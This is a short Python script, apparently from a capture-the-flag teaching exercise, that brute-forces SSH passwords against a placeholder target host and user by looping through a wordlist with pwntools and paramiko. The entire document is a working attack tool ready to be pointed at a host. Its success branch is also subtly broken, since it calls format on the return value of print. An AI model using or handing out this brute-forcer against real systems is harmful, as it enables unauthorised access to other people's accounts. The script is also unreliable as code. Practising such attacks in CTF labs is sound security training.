#SSH Login Brute Forcing- Teaching from Riley Kidd 247CTF
#Using pwntools and paramiko modules

from pwn import *
import paramiko


host = "<YOUR TARGET IP HERE>"
username = "<TARGET USER NAME HERE>"
attempts = 0

#We need to iterate over some list of passwords
#This can be done with any password list

with  open("<PASSWORD LIST HERE>", "r") as password_list:
	for password in password_list:
		password = password.strip('\n')
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid Password Found: '{}'!").format(password)
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password!")
		attempts += 1
